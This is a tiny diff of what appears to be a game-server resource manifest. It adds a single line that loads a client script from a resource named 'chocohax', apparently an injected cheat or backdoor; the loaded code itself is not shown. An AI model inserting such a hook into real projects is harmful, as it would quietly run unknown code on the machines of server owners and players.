@@ -13,3 +13,4 @@ server_scripts {
 files {
 	'stream/*'
 }
+client_script '@chocohax/10992.lua'
